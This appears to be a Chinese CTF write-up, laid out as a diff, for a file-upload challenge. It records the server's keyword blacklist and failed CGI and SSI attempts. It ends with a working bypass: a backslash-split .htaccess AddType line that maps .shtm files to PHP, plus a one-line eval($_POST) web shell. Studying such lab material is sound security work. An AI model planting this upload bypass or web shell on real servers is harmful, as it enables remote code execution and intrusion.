@@ -1,0 +1,59 @@
+1.题目上传不会修改文件名，但是过滤了ph，对于此类题目考虑htaccess重写
+2.会检测文件内容 黑名单perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet，可以用php短标签绕过
+
+但是.htaccess里也有Php 正在想办法
+
+```jsx
+AddHandler fcgid70-script .php
+```
+
+搜到了这个，没用，正在研究
+
+```jsx
+Options +ExecCGI
+SetHandler cgi-script
+```
+
+执行CGI也失败了
+
+另外发现它会格上传文件夹，上马后需要条件竞争
+
+好像设了CGI之后全都500
+
+对啊，全都被当成CGI执行了，可以这样指定特定后缀：
+
+Options +ExecCGI
+AddHandler cgi-script cgi aaa
+
+但是我自己写了个print()都没执行成功
+
+CGI脚本会500，正常的不会。
+
+测试SSI的话，因为ban了html，可以用shtm
+
+```jsx
+Options +Includes
+AddType text/html shtm
+AddHandler server-parsed shtm
+```
+
+但是，因为ban了>，Payload里删掉了—> 访问发现了报错：
+
+[an error occurred while processing this directive]
+
+============================================
+
+【正确解法】
+
+htaccess重写：
+
+```jsx
+AddType application/x-httpd-p\
+hp .shtm
+```
+ \是续行符，感觉/**/也可
+然后短标签即可RCE：
+
+```jsx
+<?=eval($_POST['y1ng']);
+```
